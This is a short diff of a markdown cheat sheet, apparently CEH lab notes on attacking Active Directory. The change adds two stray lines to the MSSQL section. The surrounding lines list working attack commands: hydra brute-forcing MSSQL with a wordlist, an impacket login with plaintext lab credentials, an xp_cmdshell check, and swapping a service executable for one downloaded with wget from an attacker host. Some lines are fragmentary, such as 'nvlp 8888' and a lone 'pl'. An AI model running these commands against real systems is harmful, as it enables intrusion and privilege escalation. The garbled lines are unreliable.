@@ -350,6 +350,8 @@ Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access
 ```
 ##  Perform Attack on MSSQL service
 ```
+pl
+pluma user.txt
 hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
 python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.
  SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
@@ -371,7 +373,7 @@ cd ../../.. ; cd "Program Files/CEH Services"
 move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
 nvlp 8888
 whoami 
-
+ 
 ```
 ##  Perform Kerberoasting Attack
 
